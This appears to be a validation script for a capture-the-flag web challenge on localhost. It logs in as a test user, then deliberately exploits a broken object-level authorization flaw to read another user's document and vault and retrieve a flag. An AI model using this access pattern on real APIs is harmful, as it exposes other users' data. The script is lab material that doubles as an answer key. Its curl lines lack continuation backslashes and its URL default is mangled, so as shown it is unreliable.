#!/bin/sh

set -eu

BASE_URL="${BASE_URL:-[http://localhost:8000}](http://localhost:8000})"

echo "[+] Checking application health..."

health="$(curl -fsS "$BASE_URL/health")"

echo "$health" | grep -q '"status":"ok"'

echo "[+] Health check passed."

echo "[+] Logging in as Alice..."

login_response="$(
curl -fsS 
-X POST 
"$BASE_URL/api/login" 
-H "Content-Type: application/json" 
-d '{"username":"alice","password":"AliceVault2026!"}'
)"

token="$(printf '%s' "$login_response" | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')"

if [ -z "$token" ]; then
echo "[-] Failed to obtain authentication token."
exit 1
fi

echo "[+] Authentication passed."

echo "[+] Checking authenticated user..."

me_response="$(
curl -fsS 
"$BASE_URL/api/me" 
-H "Authorization: Bearer $token"
)"

echo "$me_response" | grep -q '"username":"alice"'
echo "$me_response" | grep -q '"role":"user"'

echo "[+] Identity check passed."

echo "[+] Checking Alice's document list..."

documents_response="$(
curl -fsS 
"$BASE_URL/api/documents" 
-H "Authorization: Bearer $token"
)"

echo "$documents_response" | grep -q '"id":1001'
echo "$documents_response" | grep -q '"id":1002'

echo "[+] Document listing passed."

echo "[+] Checking intended BOLA behavior..."

bola_response="$(
curl -fsS 
"$BASE_URL/api/documents/2001" 
-H "Authorization: Bearer $token"
)"

echo "$bola_response" | grep -q '"owner_id":2'
echo "$bola_response" | grep -q 'vault-bob-7f3a'

echo "[+] Intended BOLA behavior confirmed."

echo "[+] Checking flag retrieval through the intended path..."

vault_response="$(
curl -fsS 
"$BASE_URL/api/vault/vault-bob-7f3a" 
-H "Authorization: Bearer $token"
)"

echo "$vault_response" | grep -Eq '"flag":"duck{[^"]+}"'

echo "[+] Flag retrieval confirmed."

echo
echo "[+] All validation checks passed."
